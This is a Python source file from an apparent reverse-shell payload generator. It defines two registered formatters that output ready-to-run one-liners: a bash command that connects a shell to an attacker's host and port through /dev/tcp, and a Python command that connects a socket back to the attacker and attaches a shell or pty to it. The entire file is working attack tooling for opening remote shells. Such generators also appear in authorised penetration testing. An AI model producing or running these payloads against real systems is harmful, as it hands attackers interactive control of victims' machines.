import random
import shlex

from revshell.formatters import register


@register
def reverse_bash(
    lhost: str, lport: int, *, bash_path: str | None = "bash", shell_path="sh"
) -> str:
    """Creates an interactive shell via bash's builtin /dev/tcp"""
    shell_path = shell_path or '/bin/sh'
    fd = random.choice(range(20, 220))
    cmd = ";".join(
        [
            f"0<&{fd}-",
            f"exec {fd}<>/dev/tcp/{lhost}/{lport}",
            f"{shell_path} <&{fd} >&{fd} 2>&{fd}",
        ]
    )
    if bash_path is None:
        return cmd
    bash_path = bash_path or '/bin/bash'
    return f"{bash_path} -c {shlex.quote(cmd)}"


@register
def reverse_python(
    lhost: str,
    lport: int,
    *,
    py_path="python3",
    shell_path="sh -i",
    pty=False,
) -> str:
    """Connect back and create a command shell via Python"""
    py_path = py_path or 'python3'
    shell_path = shell_path or '/bin/sh'

    import_stmts = ["os", "socket", "subprocess"]
    invocation = "subprocess.call({!r})".format(shlex.split(shell_path))

    if pty:
        import_stmts[-1] = "pty"
        invocation = "pty.spawn({!r})".format(shell_path)

    return "{0} -c {cmd}".format(
        py_path,
        cmd=shlex.quote(
            ";".join(
                [
                    "import %s" % ",".join(import_stmts),
                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
                    f's.connect(("{lhost}",{lport}))',
                    "[os.dup2(s.fileno(),h) for h in (0,1,2)]",
                    invocation,
                ]
            )
        ),
    )
